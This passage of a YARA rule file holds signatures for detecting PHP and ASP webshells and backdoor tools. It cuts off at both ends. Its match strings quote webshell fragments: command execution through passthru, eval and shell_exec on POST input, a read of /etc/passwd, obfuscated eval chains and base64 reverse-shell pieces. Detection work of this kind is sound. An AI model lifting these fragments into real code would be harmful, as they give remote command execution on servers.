        $s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
        $s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
        $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
        $s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
    condition:
        2 of them
}
rule WebShell_Generic_PHP_8 {
    meta:
        id = "3Sj91kUli99UjrXTg66HvW"
        fingerprint = "v1_sha256_346df2686c4d43b3210b07a30845477e057602500e67baba69b50c41e8d501fa"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Macker's Private PHPShell.php, PHP Shell.php, Safe0ver Shell -Safe Mod Bypass By Evilc0der.php"
        category = "INFO"
        super_rule = 1
        hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
        hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
        hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"

    strings:
        $s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
        $s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
        $s3 = "/* I added this to ensure the script will run correctly..." fullword
        $s14 = "<!--    </form>   -->" fullword
        $s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
        $s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword
    condition:
        3 of them
}
rule WebShell__PH_Vayv_PHVayv_PH_Vayv_klasvayv_asp_php {
    meta:
        id = "1ymo7yZxhnJ7HxbGfSMz17"
        fingerprint = "v1_sha256_42959ba1e3c0f7f198f953e98b9df87059999f5526df4338c109828d0a5a518a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
        hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
        hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
        hash3 = "4f83bc2836601225a115b5ad54496428a507a361"

    strings:
        $s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
        $s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
        $s6 = "onfocus=\"if (this.value == 'Kullan" fullword
        $s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"
    condition:
        2 of them
}
rule WebShell_Generic_PHP_9 {
    meta:
        id = "4fmS6Q8qXE85c5O8j4q5cB"
        fingerprint = "v1_sha256_566d6cbca8c9d31bbf42bbfb60c300062f46101277ba305168407af44519256a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
        category = "INFO"
        super_rule = 1
        hash0 = "89f2a7007a2cd411e0a7abd2ff5218d212b84d18"
        hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
        hash2 = "0daed818cac548324ad0c5905476deef9523ad73"

    strings:
        $s2 = ":<b>\" .base64_decode($_POST['tot']). \"</b>\";" fullword
        $s6 = "if (isset($_POST['wq']) && $_POST['wq']<>\"\") {" fullword
        $s12 = "if (!empty($_POST['c'])){" fullword
        $s13 = "passthru($_POST['c']);" fullword
        $s16 = "<input type=\"radio\" name=\"tac\" value=\"1\">B64 Decode<br>" fullword
        $s20 = "<input type=\"radio\" name=\"tac\" value=\"3\">md5 Hash" fullword
    condition:
        3 of them
}
rule WebShell__PH_Vayv_PHVayv_PH_Vayv {
    meta:
        id = "7klVEp0GmH0TL4kzKfounL"
        fingerprint = "v1_sha256_b2f2b95415bc990adac38eada20cbc793f286d51f2054bc969e9c667f16717f9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
        category = "INFO"
        super_rule = 1
        hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
        hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
        hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"

    strings:
        $s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
        $s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
        $s17 = "name=\"duzenx2\" value=\"Klas" fullword
    condition:
        2 of them
}
rule WebShell_Generic_PHP_1 {
    meta:
        id = "QIIQUTIREXtvzSto76IZW"
        fingerprint = "v1_sha256_19b260a316317d3a470c4df95306090173cb5bfde6cc48f6406c395cafa10392"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Dive Shell 1.0 - Emperor Hacking Team.php, Dive_Shell_1.0_Emperor_Hacking_Team.php, SimShell 1.0 - Simorgh Security MGZ.php, SimShell_1.0_-_Simorgh_Security_MGZ.php"
        category = "INFO"
        super_rule = 1
        hash0 = "3b086b9b53cf9d25ff0d30b1d41bb2f45c7cda2b"
        hash1 = "2558e728184b8efcdb57cfab918d95b06d45de04"
        hash2 = "203a8021192531d454efbc98a3bbb8cabe09c85c"
        hash3 = "b79709eb7801a28d02919c41cc75ac695884db27"

    strings:
        $s1 = "$token = substr($_REQUEST['command'], 0, $length);" fullword
        $s4 = "var command_hist = new Array(<?php echo $js_command_hist ?>);" fullword
        $s7 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[1])," fullword
        $s9 = "document.shell.command.value = command_hist[current_line];" fullword
        $s16 = "$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $"
        $s19 = "if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {" fullword
        $s20 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword
    condition:
        5 of them
}
rule WebShell_Generic_PHP_2 {
    meta:
        id = "40S37VYoTJ0IhElOD0t68d"
        fingerprint = "v1_sha256_b9d6ebe0148787b0f447e6bf2a825c69faefadd88b057152d64688877ee81227"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
        category = "INFO"
        super_rule = 1
        hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
        hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
        hash2 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
        hash3 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

    strings:
        $s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))" fullword
        $s4 = "\\$port = {$_POST['port']};" fullword
        $s5 = "$_POST['installpath'] = \"temp.pl\";}" fullword
        $s14 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u"
        $s16 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]"
    condition:
        4 of them
}
rule WebShell__CrystalShell_v_1_erne_stres {
    meta:
        id = "1OkRqtPEU9OSSet4FeoAtx"
        fingerprint = "v1_sha256_a0484a5a71715d6a79c89e20919ab89aaa7e85a18ee502651f1f6b29153847a3"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
        category = "INFO"
        super_rule = 1
        hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
        hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
        hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

    strings:
        $s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
        $s4 = "var_dump(curl_exec($ch));" fullword
        $s7 = "if(empty($_POST['Mohajer22'])){" fullword
        $s10 = "$m=$_POST['curl'];" fullword
        $s13 = "$u1p=$_POST['copy'];" fullword
        $s14 = "if(empty(\\$_POST['cmd'])){" fullword
        $s15 = "$string = explode(\"|\",$string);" fullword
        $s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword
    condition:
        5 of them
}
rule WebShell_Generic_PHP_3 {
    meta:
        id = "10myCOqwUis6dC8sDI0Z1G"
        fingerprint = "v1_sha256_5c264a294fc75cf2cadd3dba61bc64658989ffe5ddecfa18ba18e66492ad3c71"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Antichat Shell v1.3.php, Antichat Shell. Modified by Go0o$E.php, Antichat Shell.php, fatal.php"
        category = "INFO"
        super_rule = 1
        hash0 = "d829e87b3ce34460088c7775a60bded64e530cd4"
        hash1 = "d710c95d9f18ec7c76d9349a28dd59c3605c02be"
        hash2 = "f044d44e559af22a1a7f9db72de1206f392b8976"
        hash3 = "41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289"

    strings:
        $s0 = "header('Content-Length:'.filesize($file).'');" fullword
        $s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
        $s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
        $s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
        $s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword
    condition:
        all of them
}
rule WebShell_Generic_PHP_4 {
    meta:
        id = "6vUIF32rHe9uGYWxuCszvP"
        fingerprint = "v1_sha256_18db4c6728f0575b4d8388dab9563ee98ca9aa5fdc8534bf76856a87820b4596"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, nshell.php, Loaderz WEB Shell.php, stres.php"
        category = "INFO"
        super_rule = 1
        hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
        hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
        hash2 = "86bc40772de71b1e7234d23cab355e1ff80c474d"
        hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
        hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

    strings:
        $s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
        $s2 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword
        $s5 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword
        $s6 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword
        $s7 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword
        $s10 = "foreach ($arr as $filename) {" fullword
        $s19 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword
    condition:
        all of them
}
rule WebShell_Generic_PHP_5 {
    meta:
        id = "KuZysbG9pYUTKyeiVq17"
        fingerprint = "v1_sha256_b85b8c8debfc5b9c1904f87df7065395cca3e20b68ababd1f60a5eb19f5bfb45"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files ex0shell.php, megabor.php, GRP WebShell 2.0 release build 2018 (C)2006,Great.php"
        category = "INFO"
        super_rule = 1
        hash0 = "64461ad8d8f23ea078201a31d747157f701a4e00"
        hash1 = "3df1afbcfa718da6fc8af27554834ff6d1a86562"
        hash2 = "ad86ef7f24f75081318146edc788e5466722a629"

    strings:
        $s0 = "(($perms & 0x0400) ? 'S' : '-'));" fullword
        $s10 = "} elseif (($perms & 0x8000) == 0x8000) {" fullword
        $s11 = "if (($perms & 0xC000) == 0xC000) {" fullword
        $s12 = "$info .= (($perms & 0x0008) ?" fullword
        $s16 = "// Block special" fullword
        $s18 = "$info = 's';" fullword
    condition:
        all of them
}
rule WebShell_GFS {
    meta:
        id = "DhDPQVvZqzzGggc1DgiY1"
        fingerprint = "v1_sha256_72a3f117cb11e1461b760c47a3de74283640b6e1daa87b24e45210213bb76609"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
        category = "INFO"
        super_rule = 1
        hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
        hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
        hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"

    strings:
        $s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
        $s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
        $s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"
    condition:
        all of them
}
rule WebShell__CrystalShell_v_1_sosyete_stres {
    meta:
        id = "2FkZadWYPKEoqBxEWdtv6"
        fingerprint = "v1_sha256_78aeabe38f7457060d81c3863098b5e424bc38f13e9e86bbb6ea54827f27afcd"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, sosyete.php, stres.php"
        category = "INFO"
        super_rule = 1
        hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
        hash1 = "e32405e776e87e45735c187c577d3a4f98a64059"
        hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

    strings:
        $s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
        $s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
        $s11 = "scrollbar-darkshadow-color: #101842;" fullword
        $s15 = "<a bookmark=\"minipanel\">" fullword
        $s16 = "background-color: #EBEAEA;" fullword
        $s18 = "color: #D5ECF9;" fullword
        $s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"
    condition:
        all of them
}
rule WebShell_Generic_PHP_10 {
    meta:
        id = "563gQ7ODrMrSEaa7T1d6vy"
        fingerprint = "v1_sha256_0bf731edef55cde5d2ad16510fb9f1a240c1a06b535af7e13300fdbea470df74"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
        category = "INFO"
        super_rule = 1
        hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
        hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
        hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
        hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"

    strings:
        $s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
        $s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
        $s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
        $s12 = "else if( $mode & 0xA000 ) " fullword
        $s17 = "$s=sprintf(\"%1s\", $type); " fullword
        $s20 = "font-size: 8pt;" fullword
    condition:
        all of them
}
rule WebShell_Generic_PHP_11 {
    meta:
        id = "rNLngxnDtR0laAfmkiL8U"
        fingerprint = "v1_sha256_5a559a26314ce603d6454efb71f1243bf89daed920ca2a495a51b94a4cca0045"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
        category = "INFO"
        super_rule = 1
        hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
        hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
        hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
        hash3 = "80aba3348434c66ac471daab949871ab16c50042"

    strings:
        $s5 = "$filename = $backupstring.\"$filename\";" fullword
        $s6 = "while ($file = readdir($folder)) {" fullword
        $s7 = "if($file != \".\" && $file != \"..\")" fullword
        $s9 = "$backupstring = \"copy_of_\";" fullword
        $s10 = "if( file_exists($file_name))" fullword
        $s13 = "global $file_name, $filename;" fullword
        $s16 = "copy($file,\"$filename\");" fullword
        $s18 = "<td width=\"49%\" height=\"142\">" fullword
    condition:
        all of them
}
rule WebShell__findsock_php_findsock_shell_php_reverse_shell {
    meta:
        id = "26hBWAbgsBQkXpVosGRvvB"
        fingerprint = "v1_sha256_2459f7114482e17f087bda4b638c29e237f2f3cb5a9e41e326ed65fc1834b6be"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
        category = "INFO"
        super_rule = 1
        hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
        hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
        hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"

    strings:
        $s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
    condition:
        all of them
}
rule WebShell_Generic_PHP_6 {
    meta:
        id = "4eQ3Xl7TnoxK13z9T9ijUv"
        fingerprint = "v1_sha256_7b3f2ca3cb9516ddda1b9cac2ca5eb5d9e62e1839dad041f69a3dc7a2a186897"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
        category = "INFO"
        super_rule = 1
        hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
        hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
        hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
        hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
        hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

    strings:
        $s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
        $s5 = "echo shell_exec($com);" fullword
        $s7 = "if($sertype == \"winda\"){" fullword
        $s8 = "function execute($com)" fullword
        $s12 = "echo decode(execute($cmd));" fullword
        $s15 = "echo system($com);" fullword
    condition:
        4 of them
}

rule Unpack_Injectt {
    meta:
        id = "5CvEioyms8sq5vpOF0ymAb"
        fingerprint = "v1_sha256_d8e9ed4f2604617bd6410f36ab827affa3cc6729ba996d0d9cd9c8eb0fd96533"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Injectt.exe"
        category = "INFO"
        hash = "8a5d2158a566c87edc999771e12d42c5"

    strings:
        $s2 = "%s -Run                              -->To Install And Run The Service"
        $s3 = "%s -Uninstall                        -->To Uninstall The Service"
        $s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"
    condition:
        all of them
}
rule HYTop_DevPack_fso {
    meta:
        id = "3eE1OgNQSaoKu5rVWWZlEf"
        fingerprint = "v1_sha256_9d071c1e2e0725091a2abe24759e6e71d78e29caa76b4fff77c44e3bb381b1a2"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file fso.asp"
        category = "INFO"
        hash = "b37f3cde1a08890bd822a182c3a881f6"

    strings:
        $s0 = "<!-- PageFSO Below -->"
        $s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"
    condition:
        all of them
}
rule FeliksPack3___PHP_Shells_ssh {
    meta:
        id = "4EwLYkvJNB1jmtvXVrDU2o"
        fingerprint = "v1_sha256_40c5a5d1d714947454f4aa9f7ed09d777cb60c23933201ac8eaf0d49452af8c6"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file ssh.php"
        category = "INFO"
        hash = "1aa5307790d72941589079989b4f900e"

    strings:
        $s0 = "eval(gzinflate(str_rot13(base64_decode('"
    condition:
        all of them
}
rule Debug_BDoor {
    meta:
        id = "35VUDCgHigHKfqifZCJRoZ"
        fingerprint = "v1_sha256_ed8caeb96a6fc48fe23d5db078bbb8ba5aec3c5d4ee382cbc6bc4e01630f1460"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file BDoor.dll"
        category = "INFO"
        hash = "e4e8e31dd44beb9320922c5f49739955"

    strings:
        $s1 = "\\BDoor\\"
        $s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    condition:
        all of them
}
rule bin_Client {
    meta:
        id = "6wUcPm0J3za8tC0whWaV0q"
        fingerprint = "v1_sha256_28ce9aa136b5d41bb580e6b5b8580d3ccbb7eeec31007e68241d23c5a0f40d40"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Client.exe"
        category = "INFO"
        hash = "5f91a5b46d155cacf0cc6673a2a5461b"

    strings:
        $s0 = "Recieved respond from server!!"
        $s4 = "packet door client"
        $s5 = "input source port(whatever you want):"
        $s7 = "Packet sent,waiting for reply..."
    condition:
        all of them
}
rule ZXshell2_0_rar_Folder_ZXshell {
    meta:
        id = "4Af8q0Jp5LzzpNEq6vUXpW"
        fingerprint = "v1_sha256_72eaf90551144eccb7329e0a0e05bcc955ea2bfdb37aa87e9cae7b5f5a26bea0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file ZXshell.exe"
        category = "INFO"
        hash = "246ce44502d2f6002d720d350e26c288"

    strings:
        $s0 = "WPreviewPagesn"
        $s1 = "DA!OLUTELY N"
    condition:
        all of them
}
rule RkNTLoad {
    meta:
        id = "6sl9wgr0LrymXGVjRAObbM"
        fingerprint = "v1_sha256_ab767a7016318633055a85195ca2bab08a8c68222d46018aaf8772ab27a373c4"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file RkNTLoad.exe"
        category = "INFO"
        hash = "262317c95ced56224f136ba532b8b34f"

    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
        $s2 = "5pur+virtu!"
        $s3 = "ugh spac#n"
        $s4 = "xcEx3WriL4"
        $s5 = "runtime error"
        $s6 = "loseHWait.Sr."
        $s7 = "essageBoxAw"
        $s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"
    condition:
        all of them
}
rule binder2_binder2 {
    meta:
        id = "448k1VnVx93rIKCfFXlITF"
        fingerprint = "v1_sha256_fbe56b7d37fc7863fcf55761c0b5b671d661a713ac95f90d65b79eee9a447a9b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file binder2.exe"
        category = "INFO"
        hash = "d594e90ad23ae0bc0b65b59189c12f11"

    strings:
        $s0 = "IsCharAlphaNumericA"
        $s2 = "WideCharToM"
        $s4 = "g 5pur+virtu!"
        $s5 = "\\syslog.en"
        $s6 = "heap7'7oqk?not="
        $s8 = "- Kablto in"
    condition:
        all of them
}
rule thelast_orice2 {
    meta:
        id = "36d3ZSXE2XnlVOUhZcyzhS"
        fingerprint = "v1_sha256_075f3377a9b90c6c1ba74682415b9c0832a839afe647fa6d3c85d4e987618405"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file orice2.php"
        category = "INFO"
        hash = "aa63ffb27bde8d03d00dda04421237ae"

    strings:
        $s0 = " $aa = $_GET['aa'];"
        $s1 = "echo $aa;"
    condition:
        all of them
}
rule FSO_s_sincap {
    meta:
        id = "3s1DScznRsWrJ3rwYzj5kS"
        fingerprint = "v1_sha256_705030e93248f5ea6744f78bd7a1816aaa9772880059286b8d686e05b193d4a0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file sincap.php"
        category = "INFO"
        hash = "dc5c2c2392b84a1529abd92e98e9aa5b"

    strings:
        $s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
        $s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="
    condition:
        all of them
}
rule PhpShell {
    meta:
        id = "4mo0ii2oTzgP08t99I9DkT"
        fingerprint = "v1_sha256_95b3cedac370bf9b06092035a738722f3ec97e6cbafe3d4f742429a865576ad8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file PhpShell.php"
        category = "INFO"
        hash = "539baa0d39a9cf3c64d65ee7a8738620"

    strings:
        $s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."
    condition:
        all of them
}
rule HYTop_DevPack_config {
    meta:
        id = "uNkWl3HkWRC042OrqEIKW"
        fingerprint = "v1_sha256_b2806c30db413bca518943352f233c9d2915356a41eceed5e352b88ee34fbbd3"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file config.asp"
        category = "INFO"
        hash = "b41d0e64e64a685178a3155195921d61"

    strings:
        $s0 = "const adminPassword=\""
        $s2 = "const userPassword=\""
        $s3 = "const mVersion="
    condition:
        all of them
}
rule sendmail {
    meta:
        id = "1634DXEGrrT61zylSuwtWo"
        fingerprint = "v1_sha256_bcca9a9380d2695bc277afc9fa72c24cb26ac44c6fbcc87113b017cfe190bdab"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file sendmail.exe"
        category = "INFO"
        hash = "75b86f4a21d8adefaf34b3a94629bd17"

    strings:
        $s3 = "_NextPyC808"
        $s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"
    condition:
        all of them
}
rule FSO_s_zehir4 {
    meta:
        id = "1KH226RuS6YroI47fJfU9e"
        fingerprint = "v1_sha256_6bcfb1ee40403394bf996ecbe1bb17f9afa0c3ba9e1906881b94bbc785b4a510"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file zehir4.asp"
        category = "INFO"
        hash = "5b496a61363d304532bcf52ee21f5d55"

    strings:
        $s5 = " byMesaj "
    condition:
        all of them
}
rule hkshell_hkshell {
    meta:
        id = "2cf52bkj8t9YvVpfrMm9dV"
